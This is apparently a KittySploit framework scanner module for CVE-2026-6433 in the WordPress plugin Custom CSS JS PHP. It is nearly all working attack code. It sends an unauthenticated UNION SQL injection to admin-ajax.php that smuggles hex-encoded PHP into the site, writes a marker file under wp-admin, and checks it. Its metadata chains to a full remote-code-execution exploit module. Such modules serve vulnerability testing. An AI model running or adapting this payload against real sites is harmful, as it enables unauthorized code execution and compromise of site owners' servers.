#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Custom CSS JS PHP <= 2.0.7 SQLi → eval RCE (CVE-2026-6433)."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "custom-css-js-php"
_VULN_HIGH = (2, 0, 7)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "FlipperCode CSS/JS/PHP CVE-2026-6433 detect",
        "description": (
            "Detects CVE-2026-6433 via fc_ajax_call/wce_editor_inline_code UNION write "
            "under wp-admin/ and marker fetch."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-6433",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-6433"],
        "modules": ["exploits/multi/http/flippercode_cssjsphp_cve_2026_6433_rce"],
        "tags": ["web", "scanner", "wordpress", "sqli", "rce", "cve-2026-6433"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/flippercode_cssjsphp_cve_2026_6433_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        fname = f"ks{secrets.token_hex(4)}"
        marker = secrets.token_hex(6)
        php = f"<?php file_put_contents('{fname}.txt','{marker}'); ?>"
        hex_payload = php.encode().hex()
        sqli_id = f"0+UNION+SELECT+1,'t','php',0x{hex_payload},'header','',0,1--+"
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"action": "fc_ajax_call", "operation": "wce_editor_inline_code", "id": sqli_id},
            allow_redirects=False,
        )
        check = self.http_request(
            method="GET",
            path=self._join(f"/wp-admin/{fname}.txt"),
            allow_redirects=False,
        )
        if check and int(check.status_code or 0) == 200 and marker in (check.text or ""):
            self.set_info(
                severity="critical",
                reason="FlipperCode fc_ajax_call SQLi wrote webroot marker file",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-6433",
            )
            return True
        return False
